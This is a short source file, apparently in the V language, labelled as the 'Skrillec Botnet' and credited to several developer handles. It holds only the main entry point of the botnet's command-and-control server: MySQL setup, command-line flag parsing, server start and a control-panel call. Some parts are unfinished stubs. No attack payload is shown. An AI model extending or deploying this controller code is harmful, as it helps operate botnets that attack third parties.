/*
	[ ~ Skrillec Botnet ~ ]

	Developers:
		- Occupied
		- Awful
		- Exo
		- satis

	Since: 
		11/17/21

*/


// Importing Modules
import os
import net
import mysql

//Importing SubModules
import utils
import server
import config
import skrillec_cp

fn main() {
	// do a license check
	// and a update check
	//get mySQL info
	mut info := config.get_db_info()
	mut svr := server.Server{clients: &server.Clients{}, sqlconn: mysql.Connection{
		host: info[0],
		port: info[1].u32(),
		username: info[2],
		dbname: info[3]
	}, current: &server.Current{}, notice: &utils.NotificationSys{}}
	
	// Command Parsing 
	mut cmd_args := os.args.clone()
	for i, v in cmd_args {
		if v == "--help" { print("${config.Help_MENU}\r\n") exit(0) }
		// if v == ""
		if v == "-p" { svr.set_port(cmd_args[i+1]) }

		if v == "-sqlpw" { svr.sqlconn.password = cmd_args[i+1] }

		if v == "-reset_config" {
			if cmd_args[i+1] == "MySQL" {
				//reset mysql info
			} else if cmd_args[i+1] == "-net_info" {
				// reset net_info 
			} else if cmd_args[i+1] == "-y" {
				// Execute function that'd reset the whole config file to default
			}
		}

		// if v == ""
	}

	if (svr.sqlconn.password).len == 0 {
		print("[x] Error, Unable to start the server without MySQL password. Use -sqlpw flag to set the password or --help for help!\r\n")
	}
	if svr.port.len == 0 {
		print("[x] Warning. No port was provided. Looking through config file for port.........!\r\n")
		exit(0)
	}

	go server.start_skrillec(mut &svr)
	skrillec_cp.main_cp()
}